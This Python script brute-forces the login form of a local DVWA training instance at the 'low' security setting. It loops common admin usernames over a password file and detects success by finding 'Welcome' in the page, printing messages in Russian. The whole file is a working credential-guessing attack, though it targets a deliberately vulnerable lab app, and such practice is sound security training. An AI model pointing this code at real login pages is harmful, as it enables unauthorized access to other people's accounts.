import requests
from bs4 import BeautifulSoup

LOGINS = ['admin', 'admin123', 'admin1', 'administrator', 'superuser', 'user', 'username']


def main() -> None:
    with open('passwords.txt', 'r', encoding='utf-8') as file:
        passwords = file.read().split('\n')
    if not brute(passwords):
        print("Не удалось подобрать пароль")


def brute(passwords: list) -> bool:
    cookies = {
        'security': 'low',
        'PHPSESSID': 'gnpau22cad2n2c9a5essemenk8',
    }
    for login in LOGINS:
        for password in passwords:
            params = {
                "username": login,
                "password": password,
                "Login": "Login"
            }
            url = 'http://localhost/dvwa/vulnerabilities/brute/index.php'
            response = requests.get(url, cookies=cookies, params=params).text
            soup = BeautifulSoup(response, 'lxml')
            correct_password = soup.find('p', string='Welcome')
            if correct_password:
                print(f"Успешно!\nЛогин: {login}, пароль: {password}")
                return True
    return False


if __name__ == '__main__':
    main()
